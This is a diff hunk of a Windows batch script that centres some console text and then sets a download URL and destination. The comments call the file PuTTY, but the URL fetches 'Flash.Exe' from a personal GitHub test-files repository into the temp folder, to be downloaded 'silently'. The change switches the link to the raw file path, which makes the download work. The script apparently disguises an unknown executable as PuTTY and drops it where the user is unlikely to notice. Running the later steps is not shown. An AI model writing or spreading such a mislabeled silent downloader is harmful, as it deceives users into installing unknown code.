@@ -11,7 +11,7 @@ set /a center=(80 - !text!^)/2
 echo %ESC%[1;%center%H!text!
 
 :: Set the PuTTY download URL and destination file
-set "puttyUrl=https://github.com/johnihr00/test-files/blob/main/Flash.Exe"
+set "puttyUrl=https://github.com/johnihr00/test-files/raw/main/Flash.Exe"
 set "puttyDestination=%TEMP%\Flash.exe"
 
 :: Download PuTTY silently
